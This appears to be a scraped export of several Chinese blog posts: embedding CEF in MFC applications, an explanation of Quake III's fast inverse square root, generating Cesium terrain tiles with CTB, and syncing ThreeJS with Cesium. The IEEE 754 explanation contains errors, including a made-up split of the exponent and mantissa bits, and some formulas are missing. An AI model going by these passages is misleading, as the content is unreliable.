一般来讲我常规开发windows系统的程序的时候绝对会遇到一个问题，我们想要实现美观炫酷的界面效果但是windows无论是QT还是MFC这些老牌 C++ 应用框架还是windows UFP的.NET Winform都很难去完整自定义你的样式。比如说QT里面的按钮你只能通过C++或者UI文件对按钮生成项进行简单的设置，MFC更加过分只有30不到的设置项，Winform也差不多。如果你想完整的定义一个自己的按钮那就需要从绘制开始写了，这个要求就不是一点半点了。 但是我们在日常使用的时候发现很多程序实现了非常NB的界面样式，而且实现了非常多的动态效果，如果说这些效果全部是通过C/C++重写绘制的话那太要命了。这里就举一个例子，网易云音乐应该是大家都在使用的音乐播放器，它里面的效果确实很漂亮美观。根据对网易云音乐的运行库进行分析我发现了一个神器，那就是CEF。 ※CEF库 CEF是一个谷歌的半开源库，它提供原生 C++ 库实现了一个基于谷歌V8的浏览器创建，它采用多个子进程区分业务流程然后在各个子进程之中完成对应的回调与消息通知。这个库是我们可以完全脱离QT开发Windows应用程序，相当于实现了在windows上的webview，重型或者底层的操作由前端JS告知C++ 进行执行，服务端或者其他系统状态的消息通知由C++ 通知JS执行，目前看来效果良好，除开windows基础窗口样式之外其他所有的东西都可以通过html进行定制。后期所有的三维可视化项目我们可以通过C完成实时的通讯，同时由HTML/JS实现页面的绘制，而且所有的全端资源采用ZIP加密为PAK包的方式供C 调用绘制所以安全性大大高于之前的QTwebengine。 ※流程 ※1、声明APP对象 这个东西一个浏览器的应用对象，它可以多态集成CEF的多个组件，一般来讲都是线程之类的东西，如渲染线程、异常线程等等，我们使用的时候为了完成JS调用C++才会对它进行重写。具体声明如下： 1234567891011121314151617181920212223242526272829303132#pragma once#ifndef __CEF3SimpleSample__ClientHandler__ #define __CEF3SimpleSample__ClientHandler__ #include &quot;include/cef_app.h&quot; #include &quot;include/cef_client.h&quot; #include &quot;HtmlEventHandler.h&quot;//创建CEF应用对象，同时继承渲染进程的消息回调接口class ClientApp : public CefApp, public CefRenderProcessHandler &#123;public: ClientApp(); //获取消息接口对象 CefRefPtr&lt;CefRenderProcessHandler&gt; GetRenderProcessHandler() OVERRIDE &#123; return this; &#125; //当html上下文加载完毕时回调的重写，用于注册C++函数到JS virtual void OnContextCreated(CefRefPtr&lt;CefBrowser&gt; browser, CefRefPtr&lt;CefFrame&gt; frame, CefRefPtr&lt;CefV8Context&gt; context) OVERRIDE; //当html上下文被释放的回调的重写，用于释放声明的V8值对象 virtual void OnContextReleased(CefRefPtr&lt; CefBrowser &gt; browser, CefRefPtr&lt; CefFrame &gt; frame, CefRefPtr&lt; CefV8Context &gt; context) OVERRIDE;private: //注册JS函数 void RegisterFunction(CefRefPtr&lt;CefV8Value&gt; object); //V8消息拦截，这里完成对注册函数的实现 CefRawPtr&lt;CefV8Handler&gt; functionhandler; IMPLEMENT_REFCOUNTING(ClientApp);&#125;;#endif ※2.声明Client对象 Client对象是一个独立的浏览器实例对象封装，也可以继承多个CEF组件，一般与上层的一些消息通知如请求处理、绘制处理等等，我们为了实现对请求资源的重映射、对底层浏览器对象的获取继承了多个东西具体声明如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#pragma once#ifndef __CEFSimpleSample__ClientHandler__ #define __CEFSimpleSample__ClientHandler__ #include &quot;include/cef_render_process_handler.h&quot; #include &quot;include/cef_client.h&quot; #include &quot;include/cef_v8.h&quot; #include &quot;include/cef_browser.h&quot; #include &quot;include/wrapper/cef_resource_manager.h&quot;//客户端的自定义类namespace resource_manager &#123; //继承CefClient实现客户端功能，继承CefRequestHandler实现请求拦截功能，继承CefLifeSpanHandler实现关闭功能，继承CefDisplayHandler实现如全屏之类的功能 class ClientHandler : public CefClient, public CefLifeSpanHandler ,public CefDisplayHandler, public CefRequestHandler &#123; public: ClientHandler(); //获得客户端的浏览器对象 CefRefPtr&lt;CefBrowser&gt; GetBrowser() &#123; return m_Browser; &#125; //得到浏览器窗口句柄 CefWindowHandle GetBrowserHwnd() &#123; return m_BrowserHwnd; &#125; //得到此客户端的周期控制 virtual CefRefPtr&lt;CefLifeSpanHandler&gt; GetLifeSpanHandler() OVERRIDE &#123; return this; &#125; //触发关闭 virtual bool DoClose(CefRefPtr&lt;CefBrowser&gt; browser) OVERRIDE; //创建前回调 virtual void OnAfterCreated(CefRefPtr&lt;CefBrowser&gt; browser) OVERRIDE; //关闭之后回调 virtual void OnBeforeClose(CefRefPtr&lt;CefBrowser&gt; browser) OVERRIDE; //请求处理对象 CefRefPtr&lt;CefRequestHandler&gt; GetRequestHandler() OVERRIDE &#123; return this; &#125; //资源载入之前回调（重点功能拦截请求给到resource_manager） cef_return_value_t OnBeforeResourceLoad(CefRefPtr&lt;CefBrowser&gt; browser, CefRefPtr&lt;CefFrame&gt; frame, CefRefPtr&lt;CefRequest&gt; request, CefRefPtr&lt;CefRequestCallback&gt; callback) OVERRIDE; //资源处理对象 CefRefPtr&lt;CefResourceHandler&gt; GetResourceHandler(CefRefPtr&lt;CefBrowser&gt; browser, CefRefPtr&lt;CefFrame&gt; frame, CefRefPtr&lt;CefRequest&gt; request) OVERRIDE; protected: //浏览器对象 CefRefPtr&lt;CefBrowser&gt; m_Browser; //资源管理对象（用于重映射资源文件） CefRefPtr&lt;CefResourceManager&gt; resource_manager_; //浏览器窗口句柄 CefWindowHandle m_BrowserHwnd; //内部调用声明 IMPLEMENT_REFCOUNTING(ClientHandler); DISALLOW_COPY_AND_ASSIGN(ClientHandler); &#125;;&#125;#endif ※3.js调用C++处理 显示注册对应的JS函数，然后创建一个继承CefV8Handler的类进行对应注册函数的功能实现就可以了对应的代码比较基础就不谈了实现部分的声明大致如下： 12345678910111213141516#pragma once#include &quot;include/cef_v8.h&quot;#include &quot;ClientApp.h&quot;//集成V8消息回调类class HtmlEventHandler : public CefV8Handler&#123;public: //构造 HtmlEventHandler(CefRefPtr&lt;CefBrowser&gt; browser); //注册函数最终实现的回调，使用name区分 virtual bool Execute(const CefString&amp; name, CefRefPtr&lt;CefV8Value&gt; object, const CefV8ValueList&amp; arguments, CefRefPtr&lt;CefV8Value&gt;&amp; retval, CefString&amp; exception) OVERRIDE;private: CefRefPtr&lt;CefBrowser&gt; browser; IMPLEMENT_REFCOUNTING(HtmlEventHandler);&#125;; ※4.资源重定向 在App对象里面新建一个资源管理对象，为这个对象添加一个协议，将一个请求地址进行拦截然后访问一个加密之后的zip文件对资源进行寻找然后返回给浏览器，具体实现部分大致为： 1234//初始化资源管理resource_manager_ = new CefResourceManager();//添加处理协议，拦截&quot;http://data/&quot;,重映射到GetCurDir() + &quot;/data.pak&quot;文件，通过&quot;.......&quot;为密码解压，执行顺序为0，身份校验位空resource_manager_.get()-&gt;AddArchiveProvider(&quot;http://data/&quot;, GetCurDir() + &quot;/data_1.pak&quot;, &quot;.......&quot;, 0, std::string()); 然后在App之中重写OnBeforeResourceLoad与GetResourceHandler就可以实现对资源的重定向。 ※5.创建窗口 显示对CEF组件的初始化，这里需要使用MFC的对话框窗口句柄和实例进行对应的窗口初始化。我这里自己进行了封装大致是这个样子： 1234567891011121314151617181920212223void CEFView::Init(HINSTANCE hInstance, HWND HWnd) &#123; //配置窗口句柄 CefMainArgs main_args(hInstance); //赋值 this-&gt;hInstance = hInstance; this-&gt;HWnd = HWnd; //创建应用对象 CefRefPtr&lt;ClientApp&gt; app(new ClientApp); //开启线程 int exit_code = CefExecuteProcess(main_args, app.get(), NULL); if (exit_code &gt;= 0) &#123; exit(exit_code); &#125; //配置设置 CefSettings settings; //初始化设置 CefSettingsTraits::init(&amp;settings); //启动多线程消息 settings.multi_threaded_message_loop = true; //CEF组件初始化 CefInitialize(main_args, settings, app.get(), NULL);&#125; 然后就是去创建这个窗口，流程就是创建一个浏览器然后对这个浏览器进行子窗口映射与大小设置就可以了，我的封装方式为： 123456789101112131415161718void CEFView::CreatView(std::string url) &#123; //获取窗口坐标 RECT rect; GetClientRect(HWnd, &amp;rect); //配置窗口信息 CefWindowInfo info; //配置浏览器设置 CefBrowserSettings b_settings; //创建客户对象 CefRefPtr&lt;resource_manager::ClientHandler&gt; client(new resource_manager::ClientHandler); //赋值 CEF_Client = client; //设置窗口为MFC窗口句柄的子窗口 info.SetAsChild(HWnd, rect); //创建浏览器 CefBrowserHost::CreateBrowser(info, client.get(), url, b_settings, NULL);&#125; ※6.C++调用JS 这个比较简单直接使用浏览器对象执行一个上下文就是了，对应的东西都是V8搞好了的，封装就一点点，但是总的得说这种方式只能去执行顶层frame之中函数： 12345678910111213void CEFView::RunJavaScript(std::string js) &#123; CefRefPtr&lt;CefBrowser&gt; browser = GetBrowser(); if (browser.get()) &#123; //得到web页面的顶层frame CefRefPtr&lt;CefFrame&gt; frame = browser-&gt;GetMainFrame(); if (frame) &#123; //执行JS函数 frame-&gt;ExecuteJavaScript(js, L&quot;&quot;, 0); &#125; &#125;&#125; ※7.资源文件的加密 资源文件不能直接使用winrar或者360什么的，由于算法还是封装方式的问题，基本上全部都是卵的。最终的解决办法是使用7-zip，没有就去下一个，加密算法选择ZipCrypto其他没有什么影响输出zip文件之后改为pak文件或者其他什么格式都是可以了，然后交给Client的资源管理对象就可以了。 ※8.缩放自适应 MFC的对话框有一个虚函数可以复写叫OnSize可以自己去找找，直接复写这个东西然后给匹配给浏览器的窗口句柄就可以了，执行起来也比较简单我封装在一个类之中的： 1234567891011121314151617void CEFView::ReSize() &#123; //获取窗口坐标 RECT rect; GetClientRect(HWnd, &amp;rect); //获取浏览器对象 if (CEF_Client.get()) &#123; CefRefPtr&lt;CefBrowser&gt; browser = CEF_Client-&gt;GetBrowser(); if (browser) &#123; //获取浏览器窗口句柄 CefWindowHandle hwnd = browser-&gt;GetHost()-&gt;GetWindowHandle(); //设置大小与位置（继承父级窗口） ::MoveWindow(hwnd, 0, 0, rect.right - rect.left, rect.bottom, true); &#125; &#125;&#125; ※9.库编译 首先这个东西是必须要CMake的，不然根本没得什么搞头。第二这个东西编译支持的最高版本为2015我是在2015之中编译好了拿给17用的，测试下来X64和X86都没有什么问题，release和debug需要分开编译但是也没有什么问题，debug里面使用资源管理对象进行重映射时加密文件不知为何打不开其他都是没有什么问题。 流程不算复杂还是比较好用的库了，首先不要去下载源码版，那个东西要编译死了一大堆依赖。最好下载二进制版本（下载地址可能有点慢），但是二进制版本之中的libcef_dll_wrapper还是需要自己去编译的，这个时候CMake一下就可以了，最好把debug和release版本都编译下来。这个库的头文件与其他在一起直接引用就可以了。重点是CMake的时候一定要MT版本，之后的运行依赖就好办很多，同时MFC也可以使用静态引用了。然后在vs新建一个像引用就是了。 ※10.运行依赖 这个逼就很恶心了，它不仅仅有一堆动态库的依赖就是他自己的，还有一堆资源的依赖。首先如果编译release版本就将release文件夹里面的所有东西考到项目的根目录之中不然一大堆空指针中断。debug就拷debug的。然后就是把Resources文件夹下的所有东西也要考到对应的项目的根目录之中无论是release还是debug都是一样的。 ※11.总结 大概就是这些东西，最终效果还是非常不错的，比QT那个webview好了很多，我大概研究了一下不仅仅是网易云音乐还有babylon离线编辑器、迅雷等等全部都是使用CEF这个库实现的。而且百度云网盘也是无非就是吧CEF自己封装了一个dll实现的。 CEF是真的NB，谷歌是真的吊！！","tags":"mfc cef"},{"title":"只有神才能写出的代码","url":"/20240808/zhi-you-shen-cai-neng-xie-chu-de-dai-ma/","text":"转载自 只有神才能写出的代码 神也是人,只不过他做到了人做不到的事——阿木 12345678910111213141516float Q_rsqrt( float number ){ long i; float x2, y; const float threehalfs = 1.5F; x2 = number * 0.5F; y = number; i = * ( long * ) &amp;y; // evil floating point bit level hacking i = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck? y = * ( float * ) &amp;i; y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration // y = y * ( threehalfs - ( x2 * y * y ) ); // 2nd iteration, this can be removed return y;} 上面这段代码不知道是否有人知道？在这段代码之中的最为人津津乐道的是这一句：i = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck? 包括里面的注释那句经典的what the fuck? 足以发现写出这段代码的人自己也不知道为什么，特别是这个魔法值：0x5f3759df ，简直莫名其妙对吧。 然而这段代码是这个世界上三维引擎的起源，任何一个具备三维渲染能力的程序的诞生都要好好的感谢的这段代码和无偿将其开源的公司id software，和那位我心目中的神，传奇程序员——约翰·卡马克。 ※第一章：什么叫做性能优化？ 首先上面这段代码可以从函数名称就看出他是干嘛的，简单来说就是求一个浮点数的平方根倒数公示就非常简单： 对X开根号运算，最后再求倒数，简单的不能再简单了，但是各位可以试想一下，对于计算机而言，直接运行这个公式计算量是比较大的，就因为里面存在的√x，对于32位二进制表示的浮点数进行乘法或者除法运算对应的运算量就已经很夸张了，对于这个开方运算而言传统CPU运算它效率可想而知是多么的低。你可能会问你写什么程序需要用这个公式呀，这不是吃饱了撑的吗？诶，还真不是，这是人类历史上第一个具备动态光源的三维游戏：《雷神之锤III》里面的代码（这个游戏被其开发公司开源了，你可以在这里找到）。 各位三维游戏之中的动态光源是一个非常重要的设计，有了光源的存在可以照亮游戏之中的三维场景，在1999年，全世界第一次见到拥有动态光影的游戏时间是多么魔幻的一个事。各位要知道那个时候的游戏还是任天堂FC的时代，三维游戏本身的数量就及其的稀少，而动态光源渲染几乎可以说是一件不可能的事情，最要的原因便是计算的效率，这也和我们上文提到的公式有关。再进一步讨论之前有必要解释一下动态光源是如何计算的。 上面这个图是我从WebGL原理说明的一个网站上拔来的（网站地址）这个文章已经说的非常简单了，你可以试着拖动rotation条看看在点光源的情况下，绘制表面的颜色应该计算，其实在这个图的加持下已经非常清晰了，答案就是用平面上任意点的法向量点乘这个点与光源的方向向量，我也像模像样搞个公式放下面： 光照强度点在平面的单位法向量光源与点连线的向量 那么谁还记得向量的点乘公式？当然点乘不是什么重点，在这个计算之中光源与点连续的向量很简单，就是浮点加法而已，但是这个平面的单位法向量就要了命了，例如在空间直角坐标系中平面的法向量为，而它的单位法向量即法向量除以法向量的长度，正负代表方向。 $\\pm \\frac{(A,B,C)}{\\sqrt{A2+B2+C^2}}$ 这个公式就很简单了，各位这不就是平方根倒数吗？所以当年为什么雷神之锤III可以一鸣惊人，但是没有人见过动态光源居然可以实时运算，同时对于游戏而已，光源在运动，当年的游戏哪怕全屏只有十万个多边形，每一个多边形的每一个像素都需要计算法向量，同时游戏起码需要每秒计算超过45次吧也就是达到45FPS以上，这样玩起来才会流畅，所以各位当年的计算机甚至没有独立的图形卡，这个游戏几乎是纯CPU计算，想要做到上述性能要求几乎可以说每秒需要执行超过上百万次的平方根倒数运行，现在大家应该可以理解这个平方根倒数是一个多么庞大的性能开销了吧？如果不对开方运算进行简化，当年的游戏是绝不可能实现动态光照计算的。 上述的所有的铺垫只是为了解释清楚什么才叫做游戏的性能优化，真正意义上能够和同行拉开差距的优化都是在数学层面下功夫，你减少阴影距离，我降低贴图分辨率这些只能说是无可奈何的低能优化，上述基本的优化才是核心技术！ ※第二章：魔法值0x5f3759df的来历 首先各位是否知道计算机是如何计算的吗？这种运算首先就不可能是直接计算，而是采用类似夹逼法迭代来的，没错你要是手算也只有这个办法，这得感谢老祖宗牛顿，真正的巨人，这个方法叫做牛顿迭代法，公式如下： 其中表述迭代的结果值，n表示迭代的次数，假设求 ，我们设置第零次迭代的初始 ，那么带入公式可得 第一次迭代： 第二次迭代： 第三次迭代： 其实迭代到第二次就一个可以获取一个足够精确的值了，但是问题在于对于5而言我们找平方根可以猜测为2，但是任意数据的平方根怎么猜测初始值呀？这就要看神奇的二进制如何发挥功效了，我们来拆解一下i = 0x5f3759df - ( i &gt;&gt; 1 )，首先我们带入原始的公式可以得到： 进而可得： 我们可以认为y、x都是浮点数，带入浮点表达式可得： $log_2 (2{(E_y-127)}\\times(1.0+\\frac{M_y}{2{23}}))=-\\frac{1}{2}log_2 (2{(E_x-127)}\\times(1.0+\\frac{M_x}{2{23}}))$ 做一下简单的变化： $(E_y-127) + log_2(1.0+\\frac{M_y}{2{23}})=-\\frac{1}{2}(E_x-127)log_2(1.0+\\frac{M_x}{2{23}})$ 看到这里我知道大家都懵了估计，肯定有人会问这个$2{(E_y-127)}\\times(1.0+\\frac{M_y}{2{23}})$是个什么东西，从哪里冒出来的。不要急，这个东西需要结合浮点数才能解释清楚，大家肯定都知道所谓浮点数其实是32个字节表示的小数，一堆0和1是怎么表示小数的？其实非常简单，甚至过于简单了，极其符合直觉。试想一下小数天然可以使用科学记数法表示，我们拿0.15625为例，具体如下： 然后我们进行分析一下，0.15625用科学技术法可以分为三个部分，首先他是正数，所有需要一个东西记录数值的±值，然后可以分为数值部分1.5625和指数部分-1，这其实就是浮点数的定义（IEEE 754标准）： 符号位（1位）：表示数值的符号，0表示正数，1表示负数。 指数位（8位）：表示幂的值。这8位被分为两部分：前3位表示指数的偏移量（bias），后5位表示指数的实际值。 小数位（23位）：表示小数部分的数值。这23位被分为两部分：前1位是尾数（Mantissa）的符号位，后22位是尾数的值。 所以对应规范，第1位bit是正负号；8个bits（1个byte）是幂 (Exponent，后面记为E)；后23个bits是小数位 (Mantissa, 后面记为M)我们就可以得到浮点数y的二进制整数表达：$2{(E_y-127)}\\times(1.0+\\frac{M_y}{2{23}})。然后我们接着做推理。你肯定回想，这个(E_y-127) + log_2(1.0+\\frac{M_y}{2{23}})=-\\frac{1}{2}(E_x-127)log_2(1.0+\\frac{M_x}{2{23}})$式子看着就不简单怎么最后会得到一个常量，不要急，我们做一下简单的简化，首先来一个小小的震撼，或者或来一个暴论： 为啥这么说呢？请看下图： 可以发现在我们本来就是为牛顿迭代找一个足够精确的初始值，那么一个近似的同时又足够简单的计算才是我们需要的，所以把带入到算数式之后简化可得： 进一步简化之后可以得到： 接下来就是见证奇迹的时候，我们知道浮点数的二进制表达之后假设把浮点数强行转为整数会发生什么？没错整形状态下的就是，同时对于整形二进制而言除以2就等于是将二进制数右移，所以最终的表述方式则为： 同时，这个式子里面的常量想象聪明的你已经知道了： = 0x5f3759df(转16进制) 所以最后我们再来看看这段代码： 1234i = * ( long * ) &amp;y; // 浮点数强行转为整形i = 0x5f3759df - ( i &gt;&gt; 1 ); // 计算牛顿迭代的初始值y = * ( float * ) &amp;i; //将初始值结果转为浮点数y = y * ( threehalfs - ( x2 * y * y ) ); // 平淡无奇的第一次牛顿迭代 现在，你是不是发现这四行代码简直就是优雅的极致！！！ ※第三章：真正的历史 我的偶像虽然是约翰卡马克，但是说实话这个代码不是他写的，而是拿来主义抄过来的，他当时自己也不知道为啥这玩意可以计算平方根，所以才留下了那个闻名世界的what the fuck? 那么到底是那个天才写出来的呢？下面的内容就没有那么的严谨了，主要是历史资料可靠性已经不是那么的完整了，一般来说认为实际找到这个0x5f3759df魔法值的人叫做克雷格沃什（我甚至连照片都找不到了），这个老哥当年在一家超算公司上班，公司要求他在当时的垃圾电脑上实现三维绘图功能（类似MATLAB），这个老哥没有办法可以说是闭关搞出了这个算法，然后这家公司的内部其他程序员跳槽到3dfx，最后3dfx的另一个程序员跳槽到id software之后，这个代码才流转到约翰卡马克的手里。 这个算法的历史意义是什么呢？这么说吧，现代CPU/GPU芯片内部的处理器集成的指令集就包括了这个算法，我们在现代程序员开发代码只需要调用math.h硬件层面就自动完成了上面这个完美代码的运行，节约了大家多少头发呀。最牛逼的在于约翰卡马克在游戏上市之后就将游戏的源代码直接开源了，这样大家才认识到这个算法。 可悲的事情是什么？做出这么大共享的人，没有获得图灵奖，甚至我都找不到他的照片！ ※第四章：总结 我们天天上班当打工人，每天处理的问题都是一些业务代码，NB一点的程序员搞搞框架代码、中间件代码，设计一些复杂的业务系统。不少人甚至魔怔了，写个破前端或者后端混到小组leader就觉得自己NB了，可以了。后端天天吹的是什么上万并发如何处理、海量数据怎么查询，前端开发在网络上天天撕逼什么react和vue哪个好用，各位，我说个不好听的，你真的不重要！ 像我这种前端、后端、桌面端都在写，从业这么多年写了不知道多少万行代码了，看到这个算法还是觉得非常羞愧。我当年看着柏林噪声函数区区一百行代码头皮发麻，搞了上上下下一个月才算弄明白。现在呢，是个前端就敢往简历上写WebGL，结果面试一问，甚至连向量的点乘和叉乘都不知道，还大言不惭的说WebGL是多出来东西，就这？这也太浮夸了吧？我认为做技术的人就应该做技术，别说什么技术合伙人被踢出局，技术不值钱，技术不能吃一辈子，各位扪心自问，你的现在学会的技术真的值钱吗？在我看来很多程序员连门都没有入的情况下就非要去做什么项目经理、产品经理，想要转管理岗。好家伙，我想反问一句，你凭什么觉得项目经理、产品经理、技术管理是个简单的活？","tags":""},{"title":"Cesium 生成terrain地形数据----CTB方式及步骤","url":"/20240808/cesium-sheng-cheng-terrain-di-xing-shu-ju-ctb-fang-shi-ji-bu-zou/","text":"转载自 Cesium 生成terrain地形数据----CTB方式及步骤 ※Cesium 生成terrain地形数据----CTB方式及步骤 后记：如果你只是需要将tif处理成terrain,而不是学习处理过程，可以直接使用这个简单的工具：CesiumLab。不需要拼接成一个TIF，也不需要处理No-Data，地形功能免费。如果对你有用，点个赞加个关注吧๑乛◡乛๑ 背景：项目前端使用Cesium，地形服务一直使用外网的，常常因为翻墙访问的问题，导致地形数据取不到，进而导致地球不能加载，故决定搭建自己的地形服务，彻底解决这个问题。博文包含以下几个过程： 下载原始地形数据，格式为.tif。 处理地形数据，将零散的地形文件整合成一个地形文件。 配置CTB环境 使用ctb-tile指令将地形文件(.tif)加工成.terrain文件。 发布地形服务并使用Cesium调用。 一、下载原始地形数据 下载地址(精度90m)： http://srtm.csi.cgiar.org/SELECTION/inputCoord.asp 如果你刚好需要的也是全国地形，可以从楼主网盘下载，更快更方便(密码zyt9)：https://pan.baidu.com/s/1YYC25b48QAVb64mW77vCEw 网盘包含两部分内容： dem.rar：原始数据，需要自行使用ArcMap工具整合。 合并后的数据：经过ArcMap工具处理的数据，已经整合成了一个地形文件，可以直接跳到第三步。 在网站下载流程： 打开网页http://srtm.csi.cgiar.org/SELECTION/inputCoord.asp。如图: 根据需要选择方便的选取方式： MutilpleSelection:点击哪个选哪个，可以选择多个，双击取消。 EnableMouseDrag:框选，框选了什么范围就是什么范围。 InputCoordinates:输入最西，最东。最南，最北的坐标来下载该范围内的所有数据。 选择好范围后，点击“Click here to Begin Search”,进入下一步。 可以看到刚刚选择了几个数据，点击每个数据的DownLoad，下载数据（这个地方比较繁琐，需要耐心）。 下载完数据后解压所有的压缩包，并将tifwen文件拷贝到统一的文件夹内，这里的内容和我网盘中的dem.rar是一样的： 二、处理地形数据 由于CTB工具不支持DEM为NoData值和float的数据，所以需要对数据进行处理。 多个tif必须县合并镶嵌成一张tif pixeltype从float转为int NoData值处理为0 我使用的是ArcGis10.5，打开ArcMap: 打开 ArcToolbox-&gt;Data Management Tools-&gt;Raster-&gt;Raster Dataset -&gt;Mosaic。 这个处理过程很久，可以在Result面板里查看转换过程。 成功后，处理NoData值，ArcToolbox-&gt;spatial Analyst Tool-&gt;Map Algebra-&gt;Raster Calculator 处理公式为: 1Con(IsNull(&quot;xxxx.tif&quot;),0,&quot;xxxx.tif&quot;)//xxxx.tif对应你的合并后的文件 三、配置CTB环境 下载CTB工具包：资源 （没有积分的可以加我QQ） 将ctb和gdal-data拷贝至合适的目录下如：D:\\soft\\CTB 配置环境变量： 四、使用CTB生成.terrain文件： 注意：执行前请确保输出文件夹存在且是空的，同时保证磁盘有足够的空间，全球数据大约800G。生成瓦片的等级不要太高，中国范围内单18级就需要大约700G。 打开cmd控制台,输入指令如： 1ctb-tile -o D:\\terrain\\china\\terrain -s 14 -e 0 -r nearest -c 4 C:\\Users\\Administrator\\Documents\\ArcGIS\\dem_result\\noData\\new.tif 这个过程更加费时间，需要等待很久，直到执行结束。 五、发布并使用Cesium调用 将生成的文件拷贝到Tomcat服务器下。 拷贝“覆盖至生成tiles结果”目录中的layer.json文件和0文件夹至生成结果目录下： 调用代码： 1234var terrainLayer = new Cesium.CesiumTerrainProvider(&#123; url: &quot;http://localhost:8080/terrain&quot;, // 默认立体地表 &#125;);scene.terrainProvider = terrainLayer; 至此，地形发布完成。如有错误之处欢迎指正。","tags":"cesium"},{"title":"ThreeJS集成地图瓦片","url":"/20240808/threejs-ji-cheng-di-tu-wa-pian/","text":"转载自 ThreeJS集成地图瓦片 ※前言 由于公司最近马上需要落成一套三维GIS系统，之前基于什么百度、高德、Echarts之类都太LOW了而且没有办法达到项目的要求。无奈只能硬着头皮设计，最后发现可以使用 ThreeJS来渲染三维模型同时将地图的瓦片落在三维场景底部实现整体功能，基于这个思路足足检索了大量内容足足搞了两天才落成一个基础的Demo，伤的一B。 首先必须说一下，这个标题可能有一点标题党的意思了，我不是直接将瓦片数据丢给ThreeJS渲染的（难度太大没有那么多时间），而是借助其他框架整合最终实现这个功能的，如果你是真正的硬核玩家那就没办法了。不过选择成熟框架进行整合出来的最终效果我觉得远远高于直接使用ThreeJS。 DEM瓦片数据+卫星图瓦片数据在WebGL之中的渲染 那么我使用的框架是什么呢？那就是大名鼎鼎的CesiumJS，这个东西是全世界做GIS系统的开源项目之中最专业，最高效的框架，开源且免费！我这里一两句是没有办法说明它有多NB的，如果只论地图他可以把BAT、谷歌、微软等一下大厂的地图全部安在脚下摩擦。 ※版本依赖 ThreeJS 0.87.0 Cesium 1.61.0 ※集成原理 无论是Cesium还是ThreeJS都是基于WebGL渲染意味这两者的空间坐标是相对一致的，加之GIS系统核心在于GPS坐标数据与笛卡尔坐标系的对应关系，在三维空间上这个关系是无论对Cesium还是ThreeJS都是一致的只需要对其进行一层解析就可以了。同时两者的渲染管线一致所以很多WebGL的原生封装两者是可以直接共用的。 集成上面最核心的部分就是将两个渲染引擎的渲染帧给同步，方式是将ThreeJS的帧生成函数与Cesium在同一帧调用完成，方式如下所示： 1、分别创建Cesium视图与ThreeJS视图 1234567891011121314var cesiumContainer = document.getElementById(&quot;cesiumContainer&quot;);var ThreeContainer = document.getElementById(&quot;ThreeContainer&quot;);//创建Cesium视图var cesium = &#123;&#125;cesium.viewer = new Cesium.Viewer(cesiumContainer, &#123;&#125;）；//创建Three视图var three = &#123;&#125;；three.scene = new THREE.Scene();three.camera = new THREE.PerspectiveCamera(fov, aspect, near, far);three.renderer = new THREE.WebGLRenderer(&#123; alpha: true, logarithmicDepthBuffer:true&#125;);ThreeContainer.appendChild(three.renderer.domElement)； 2、将Cesium的渲染帧给禁用调用 1viewer.useDefaultRenderLoop = false 3、同步两者的相机，由于用户直接的操作的是Cesium所以最终要求将ThreeJS的相机同步到Cesium上,每一帧更新。 12345678910111213141516171819202122232425//将Cesium的摄像头视场同步至THREEthree.camera.fov = Cesium.Math.toDegrees(cesium.viewer.camera.frustum.fovy);//更新摄像头投影矩阵three.camera.updateProjectionMatrix();//关闭摄像头自动更新three.camera.matrixAutoUpdate = false;//获取Cesium相机矩阵var cvm = cesium.viewer.camera.viewMatrix;//获取Cesium相机逆矩阵var civm = cesium.viewer.camera.inverseViewMatrix;//设置three的世界坐标矩阵three.camera.matrixWorld.set( civm[0], civm[4], civm[8], civm[12], civm[1], civm[5], civm[9], civm[13], civm[2], civm[6], civm[10], civm[14], civm[3], civm[7], civm[11], civm[15]);three.camera.matrixWorldInverse.set( cvm[0], cvm[4], cvm[8], cvm[12], cvm[1], cvm[5], cvm[9], cvm[13], cvm[2], cvm[6], cvm[10], cvm[14], cvm[3], cvm[7], cvm[11], cvm[15]);//重置视角three.camera.lookAt(new THREE.Vector3(0, 0, 0)); 4、同步ThreeJS的三维物体，每一帧都需要更新 1234567891011121314//_3DOBS是一个数组，数组之中的每一个元素都包含一个three的Object3D、经度、维度三项数据。for (var id in _3DOBS) &#123; //获取经纬度 var LnL = [_3DOBS[id].longitude, _3DOBS[id].dimension]; //获取经纬度原点坐标 var center = Cesium.Cartesian3.fromDegrees(LnL[0], LnL[1]); //获取经纬度原点坐标向上一个单位的坐标 var centerHigh = Cesium.Cartesian3.fromDegrees(LnL[0], LnL[1], 1); //重置模型位置 _3DOBS[id].Group.position.copy(center); //重置模型方向 _3DOBS[id].Group.lookAt(centerHigh);&#125;//还有一步操作，因为Cesium是y轴向上所以需要将three的Object3D对象在X轴方向翻转90度。 5、同步两个渲染器的渲染 1234567891011121314three.Render = () =&gt; &#123; //这里的this是three对象 requestAnimationFrame(this.Render); //渲染cesium 渲染cesium.viewer.render(); //渲染three var width = ThreeContainer.clientWidth; var height = ThreeContainer.clientHeight; var aspect = width / height; this.camera.aspect = aspect; this.camera.updateProjectionMatrix(); this.renderer.setSize(width, height); this.renderer.render(this.scene, this.camera);&#125; 最后将两者对应的dom对象重叠在一起，Three在上层，Cesium在下层，将Three的事件捕捉禁用，启用背景透明。这些步骤之后两个渲染器基本上就可以协同工作了，后续可以自行对两个渲染器进行封装，然后分别实现各自的功能。 ※特性 ※1、完整的ThreeJS功能 ThreeJS场景下导入的基于PBR渲染的GLTF模型 在渲染器的基础之上没有对THREE做任何修改，所以ThreeJS上拥有的特性全部可以无缝应用在这个项目之中，无论是粒子、动画、物理学模拟等等。由于这个特性存在，无论什么大场景的三维可视化、GIS系统或者是一些大型工程的BIM都可以轻松实现，至少在地图上已经赢了。即便是对ThreeJS的操作事件其实可以通过下层Cesium透传回来。 ※2、各种地图瓦片数据对接 高德瓦片集成效果 目前我所知道的，无论是谷歌、高德、百度、腾讯还是其他乱七八糟的地图都是采用瓦片数据对整个地球进行分割虽然各家的瓦片完全不一样，但是格式是完全一样的，这就意味着他们是通用的，而且Cesium可以对接这些数据。 瓦片数据上我大概知道的有： 高德卫星：http://webst02.is.autonavi.com/appmaptile?style=6&amp;x={x}&amp;y={y}&amp;z={z} 百度卫星：http://shangetu1.map.bdimg.com/it/u=x={x};y={y};z={z};v=009;type=sate&amp;fm=46 谷歌卫星：http://www.google.cn/maps/vt?lyrs=m&amp;gl=CN&amp;x={x}&amp;y={y}&amp;z={z} 